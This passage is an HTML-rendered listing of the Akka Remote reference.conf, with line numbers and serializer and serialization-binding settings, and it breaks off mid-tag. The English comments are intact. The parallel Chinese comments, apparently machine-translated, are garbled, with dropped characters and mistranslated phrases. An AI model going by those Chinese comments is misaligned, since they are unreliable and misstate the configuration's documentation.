class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br></pre></td><td class="code"><pre><span class="line">#//#shared</span><br><span class="line">#####################################</span><br><span class="line"># Akka Remote Reference Config File #</span><br><span class="line">#####################################</span><br><span class="line"></span><br><span class="line"># This is the reference config file that contains all the default settings.</span><br><span class="line"># Make your edits/overrides in your application.conf.</span><br><span class="line"></span><br><span class="line"># comments about akka.actor settings left out where they are already in akka-</span><br><span class="line"># actor.jar, because otherwise they would be repeated in config rendering.</span><br><span class="line">#</span><br><span class="line"># For the configuration of the new remoting implementation (Artery) please look</span><br><span class="line"># at the bottom section of this file as it is listed separately.</span><br><span class="line"></span><br><span class="line">akka &#123;</span><br><span class="line"></span><br><span class="line">  actor &#123;</span><br><span class="line"></span><br><span class="line">    serializers &#123;</span><br><span class="line">      akka-containers = &quot;akka.remote.serialization.MessageContainerSerializer&quot;</span><br><span class="line">      akka-misc = &quot;akka.remote.serialization.MiscMessageSerializer&quot;</span><br><span class="line">      artery = &quot;akka.remote.serialization.ArteryMessageSerializer&quot;</span><br><span class="line">      proto = &quot;akka.remote.serialization.ProtobufSerializer&quot;</span><br><span class="line">      daemon-create = &quot;akka.remote.serialization.DaemonMsgCreateSerializer&quot;</span><br><span class="line">      primitive-long = &quot;akka.remote.serialization.LongSerializer&quot;</span><br><span class="line">      primitive-int = &quot;akka.remote.serialization.IntSerializer&quot;</span><br><span class="line">      primitive-string = &quot;akka.remote.serialization.StringSerializer&quot;</span><br><span class="line">      primitive-bytestring = &quot;akka.remote.serialization.ByteStringSerializer&quot;</span><br><span class="line">      akka-system-msg = &quot;akka.remote.serialization.SystemMessageSerializer&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    serialization-bindings &#123;</span><br><span class="line">      &quot;akka.actor.ActorSelectionMessage&quot; = akka-containers</span><br><span class="line"></span><br><span class="line">      &quot;akka.remote.DaemonMsgCreate&quot; = daemon-create</span><br><span class="line"></span><br><span class="line">      &quot;akka.remote.artery.ArteryMessage&quot; = artery</span><br><span class="line"></span><br><span class="line">      # 因为akka.protobuf.Message没有扩展Serializable但</span><br><span class="line">      # GeneratedMessage做，需要使用更具体的在这里的顺序</span><br><span class="line">      # 避免歧义。</span><br><span class="line">      # Since akka.protobuf.Message does not extend Serializable but</span><br><span class="line">      # GeneratedMessage does, need to use the more specific one here in order</span><br><span class="line">      # to avoid ambiguity.</span><br><span class="line">      &quot;akka.protobuf.GeneratedMessage&quot; = proto</span><br><span class="line"></span><br><span class="line">      #自从com.google.protobuf.Message没有扩展Serializable但是</span><br><span class="line"></span><br><span class="line">      # GeneratedMessage做，需要使用更具体的在这里的顺序</span><br><span class="line">      # 避免歧义。</span><br><span class="line">      # This com.google.protobuf serialization binding is only used if the class can be loaded，</span><br><span class="line">      # 即com.google.protobuf依赖已经添加到应用程序项目中。</span><br><span class="line">      # Since com.google.protobuf.Message does not extend Serializable but</span><br><span class="line">      # GeneratedMessage does, need to use the more specific one here in order</span><br><span class="line">      # to avoid ambiguity.</span><br><span class="line">      # This com.google.protobuf serialization binding is only used if the class can be loaded,</span><br><span class="line">      # i.e. com.google.protobuf dependency has been added in the application project.</span><br><span class="line">      &quot;com.google.protobuf.GeneratedMessage&quot; = proto</span><br><span class="line">      </span><br><span class="line">      &quot;java.util.Optional&quot; = akka-misc</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    # 了保持协议的向后兼容性，这些绑定没有</span><br><span class="line">    # 认包含。可以使用enable-additional-serialization-bindings=on来启用它们。</span><br><span class="line">    # 果akka.remote.artery是默认启用的。如果启用了=</span><br><span class="line">    # akka.actor.allow-java-serialization =。</span><br><span class="line">    # For the purpose of preserving protocol backward compatibility these bindings are not</span><br><span class="line">    # included by default. They can be enabled with enable-additional-serialization-bindings=on.</span><br><span class="line">    # They are enabled by default if akka.remote.artery.enabled=on or if </span><br><span class="line">    # akka.actor.allow-java-serialization=off.</span><br><span class="line">    additional-serialization-bindings &#123;</span><br><span class="line">      &quot;akka.actor.Identify&quot; = akka-misc</span><br><span class="line">      &quot;akka.actor.ActorIdentity&quot; = akka-misc</span><br><span class="line">      &quot;scala.Some&quot; = akka-misc</span><br><span class="line">      &quot;scala.None$&quot; = akka-misc</span><br><span class="line">      &quot;akka.actor.Status$Success&quot; = akka-misc</span><br><span class="line">      &quot;akka.actor.Status$Failure&quot; = akka-misc</span><br><span class="line">      &quot;akka.actor.ActorRef&quot; = akka-misc</span><br><span class="line">      &quot;akka.actor.PoisonPill$&quot; = akka-misc</span><br><span class="line">      &quot;akka.actor.Kill$&quot; = akka-misc</span><br><span class="line">      &quot;akka.remote.RemoteWatcher$Heartbeat$&quot; = akka-misc</span><br><span class="line">      &quot;akka.remote.RemoteWatcher$HeartbeatRsp&quot; = akka-misc</span><br><span class="line">      &quot;akka.actor.ActorInitializationException&quot; = akka-misc</span><br><span class="line"></span><br><span class="line">      &quot;akka.dispatch.sysmsg.SystemMessage&quot; = akka-system-msg</span><br><span class="line"></span><br><span class="line">      &quot;java.lang.String&quot; = primitive-string</span><br><span class="line">      &quot;akka.util.ByteString$ByteString1C&quot; = primitive-bytestring</span><br><span class="line">      &quot;akka.util.ByteString$ByteString1&quot; = primitive-bytestring</span><br><span class="line">      &quot;akka.util.ByteString$ByteStrings&quot; = primitive-bytestring</span><br><span class="line">      &quot;java.lang.Long&quot; = primitive-long</span><br><span class="line">      &quot;scala.Long&quot; = primitive-long</span><br><span class="line">      &quot;java.lang.Integer&quot; = primitive-int</span><br><span class="line">      &quot;scala.Int&quot; = primitive-int</span><br><span class="line"></span><br><span class="line">      # Java Serializer默认用于异常。</span><br><span class="line"></span><br><span class="line">      # 建议自定义序列化器</span><br><span class="line">      # 远程tor.Status.Failure中请求回复。您可以添加</span><br><span class="line">      # 绑定到akka-misc (MiscMessageSerializerSpec)的异常</span><br><span class="line">      # 一个构造函数的单个message String或构造函数的message String为</span><br><span class="line">      # 为第一个参数，cause Throwable作为第二个参数。请注意，事实并非如此</span><br><span class="line">      # 一般异常，如IllegalArgumentException，添加此绑定是安全的</span><br><span class="line">      # 因为它可能有一个没有必需构造函数的子类。</span><br><span class="line">          </span><br><span class="line">      # Java Serializer is by default used for exceptions.</span><br><span class="line">      # It&#x27;s recommended that you implement custom serializer for exceptions that are</span><br><span class="line">      # sent remotely, e.g. in akka.actor.Status.Failure for ask replies. You can add</span><br><span class="line">      # binding to akka-misc (MiscMessageSerializerSpec) for the exceptions that have</span><br><span class="line">      # a constructor with single message String or constructor with message String as</span><br><span class="line">      # first parameter and cause Throwable as second parameter. Note that it&#x27;s not</span><br><span class="line">      # safe to add this binding for general exceptions such as IllegalArgumentException</span><br><span 